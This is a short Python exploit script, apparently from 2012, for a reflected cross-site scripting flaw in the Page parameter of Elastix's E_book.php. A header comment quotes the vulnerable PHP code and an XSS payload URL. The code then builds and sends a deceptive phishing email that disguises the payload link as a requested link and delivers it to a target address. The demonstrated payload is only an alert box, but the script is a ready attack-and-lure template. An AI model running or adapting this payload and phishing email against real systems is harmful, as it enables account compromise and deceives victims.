#! /usr/bin/python
# Author cheki
# Date 28/11/2012
# Test on Linux(mint)
# Vendor Elastix.org
# Exploit: https://192.168.2.199/xmlservices/E_book.php?Page=2%3Cscript%3Ealert%28%221%22%29;%3C/script%3E
#                     Vulnerability $Page Parameter {E_book.php file}
#                     $Page = $_GET['Page'];          // Page index
#                     $idx_phone = $_GET['phone'];    // phone's address book index
#                     if ( $Page == 0  )
#                     {
#                     $Page = 1;
#                     }

import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
me = "your mail"
target_mail = "target mail"
msg = MIMEMultipart('alternative')
msg['Subject'] = "Link"
msg['From'] = me
msg['To'] = target_mail
text = "Hi!\nHow are you?\nHere is the link you wanted"
html = """\
<html>
  <head></head>
  <body>
    <p>Hi!<br>
       How are you?<br>
       Here is the <a href="https://192.168.2.199/xmlservices/E_book.php?Page=2%3Cscript%3Ealert%28%221%22%29;%3C/script%3E">link</a> you wanted.
    </p>
  </body>
</html>
"""
part1 = MIMEText(text, 'plain')
part2 = MIMEText(html, 'html')
msg.attach(part1)
msg.attach(part2)
s = smtplib.SMTP('localhost')
s.sendmail(me, target_mail, msg.as_string())
s.quit()
